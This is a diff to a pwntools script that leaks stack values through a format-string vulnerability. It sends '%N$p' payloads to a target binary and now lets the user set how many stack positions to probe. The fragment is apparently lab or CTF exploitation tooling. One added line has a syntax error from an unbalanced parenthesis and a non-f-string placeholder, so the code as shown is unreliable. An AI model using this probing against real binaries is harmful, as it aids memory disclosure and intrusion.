@@ -8,11 +8,19 @@ This script will only work if the binary is vulnerable to print format vulnerabi
 from pwn import *
 import itertools
 
+# Loops until the user enters a valid integer that corresponds with the number of memory addresses the script should parse through.
+while(True):
+  try:
+    count = int(input("Please enter the number of memory addresses we should try: "))
+    break
+  except Exception as e:
+    print("ERROR: Please enter a valid integer, your response ({count}) was not valid."))
+
 # Loops until a break occurs
 while(True):
   # Errors out if the user enters invalid hex (address location) data.
   try:
-    print("Enter the expected start address of the program: ")
+    print("\nEnter the expected start address of the program: ")
     start_addr = input("Address: ")
     # Attempts to conver the string to an integer and then to hex, if it fails the user did something wrong.
     hex(int(start_addr, 16))
@@ -52,8 +60,8 @@ p.recvline()
 matches = []
 exact_matches = []
 
-# Loops through the values 1-40, trying out those stack locations.
-for i in range(1,40):
+# Loops through the values 1-count, trying out those stack locations.
+for i in range(1,count):
   # Sends the line that we'll be using to get the leak, .encode is necessary to quiet an annoying pwntools warning.
   p.sendline(f'%{i}$p'.encode())
 
